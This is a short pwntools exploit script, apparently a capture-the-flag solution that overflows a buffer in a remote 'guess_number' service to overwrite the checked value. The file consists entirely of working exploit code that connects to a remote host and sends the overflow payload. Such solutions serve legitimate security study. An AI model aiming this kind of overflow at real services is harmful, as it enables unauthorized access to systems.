#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

#  io = process("./guess_number")
io = remote("111.230.149.72", 10002)

payload = cyclic(0x10C + 0x8) + p32(0)

io.sendlineafter("guess:", payload)
print io.recvall()
io.close()
